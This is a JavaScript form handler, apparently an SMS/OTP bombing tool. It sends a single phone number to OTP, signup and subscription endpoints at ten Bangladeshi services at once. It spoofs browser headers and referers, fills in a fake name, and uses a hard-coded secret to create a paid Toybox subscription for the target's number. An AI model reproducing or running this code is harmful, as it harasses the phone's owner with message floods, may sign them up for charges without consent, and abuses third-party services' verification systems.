document.getElementById("otp-form").addEventListener("submit", function(event) {
    event.preventDefault();  // Prevent the form from submitting in the traditional way

    const phoneNumber = document.getElementById("phone_number").value;
    const responseMessage = document.getElementById("response-message");

    if (!phoneNumber) {
        responseMessage.textContent = "Please enter a valid phone number.";
        responseMessage.className = "error";
        return;
    }

    // Concatenate "88" with the phone number for the API requests
    const mobileNumber = "88" + phoneNumber;

    // API URLs and headers

    // Toybox API
    const toyboxUrl = 'https://api.toybox.live/bdapps_handler.php';
    const toyboxHeaders = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1'
    };
    const toyboxData = {
        "Operation": "CreateSubscription",
        "MobileNumber": mobileNumber,
        "PackageID": 100,
        "Secret": "HJKX71%UHYH"
    };

    // Ghoori Learning API
    const ghooriUrl = "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web&_lang=bn";
    const ghooriHeaders = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
        "Content-Type": "application/json",
        "Referer": "https://ghoorilearning.com/",
        "Origin": "https://ghoorilearning.com"
    };
    const ghooriData = {
        "name": "Alamin Sheikh", // Replace with actual name if needed
        "phoneNumber": mobileNumber,
        "service": "redx"
    };

    // RedX API
    const redxUrl = "https://api.redx.com.bd/v1/user/signup";
    const redxHeaders = {
        "Content-Type": "application/json"
    };
    const redxData = {
        "name": "Alamin Sheikh", // Replace with actual name if needed
        "phoneNumber": mobileNumber,
        "service": "redx"
    };

    // Quizgiri API
    const quizgiriUrl = "https://developer.quizgiri.xyz/api/v2.0/send-otp?";
    const quizgiriHeaders = {
        "Content-Type": "application/json"
    };
    const quizgiriData = {
        "country_code": "+880", // Use +880 for Bangladesh
        "phone": phoneNumber
    };

    // QuizTime API
    const quiztimeUrl = 'https://developer.quiztime.gamehubbd.com/api/v2.0/send-otp';
    const quiztimeHeaders = {
        'Content-Type': 'application/json',
    };
    const quiztimeData = {
        "country_code": "+88",  // Use +88 for Bangladesh
        "phone": phoneNumber
    };

    // Bikroy API
    const bikroyUrl = `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${mobileNumber}`;
    const bikroyHeaders = {
        "Host": "bikroy.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
        "Application-name": "web",
        "Connection": "keep-alive"
    };

    // Ecourier API
    const ecourierUrl = `https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=${mobileNumber}`;
    const ecourierHeaders = {
        'Accept': '*/*',
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Origin': 'https://ecourier.com.bd',
        'Referer': 'https://ecourier.com.bd/',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };

    // Fundesh API
    const fundeshUrl = 'https://fundesh.com.bd/api/auth/generateOTP';
    const fundeshHeaders = {
        'authority': 'fundesh.com.bd',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://fundesh.com.bd',
        'referer': 'https://fundesh.com.bd/fundesh/profile',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    const fundeshData = {
        'msisdn': mobileNumber, // Using mobileNumber here
    };

    // Osudpotro API
    const osudpotroUrl = 'https://api.osudpotro.com/api/v1/users/send_otp';
    const osudpotroHeaders = {
        'referer': 'https://osudpotro.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    const osudpotroData = {
        'mobile': `+88${phoneNumber}`, // Formatted with country code
        'deviceToken': 'web',
        'language': 'en',
        'os': 'web',
    };

    // Rokomari API
    const rokomariUrl = `https://www.rokomari.com/resend-verification-code?email_phone=88${mobileNumber}`;
    const rokomariHeaders = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
        'Connection': 'keep-alive',
    };

    // Function to send the POST request to an API
    function sendPostRequest(url, headers, data) {
        return fetch(url, {
            method: 'POST',
            headers: headers,
            body: JSON.stringify(data)
        })
        .then(response => {
            if (response.ok) {
                return response.json();
            }
            throw new Error("Failed to send data.");
        });
    }

    // Send the POST request to all eleven APIs (Including Rokomari)
    Promise.all([
        sendPostRequest(toyboxUrl, toyboxHeaders, toyboxData),
        sendPostRequest(ghooriUrl, ghooriHeaders, ghooriData),
        sendPostRequest(redxUrl, redxHeaders, redxData),
        sendPostRequest(quizgiriUrl, quizgiriHeaders, quizgiriData),
        sendPostRequest(quiztimeUrl, quiztimeHeaders, quiztimeData),
        sendPostRequest(bikroyUrl, bikroyHeaders, {}),  // Bikroy API
        sendPostRequest(ecourierUrl, ecourierHeaders, {}),  // Ecourier API
        sendPostRequest(fundeshUrl, fundeshHeaders, fundeshData),  // Fundesh API
        sendPostRequest(osudpotroUrl, osudpotroHeaders, osudpotroData),  // Osudpotro API
        sendPostRequest(rokomariUrl, rokomariHeaders, {})  // Added Rokomari API
    ])
    .then(results => {
        // On success for all requests
        responseMessage.textContent = "OTP sent and subscription created successfully!";
        responseMessage.className = "success";
    })
    .catch(error => {
        // On error
        responseMessage.textContent = error.message;
        responseMessage.className = "error";
    });
});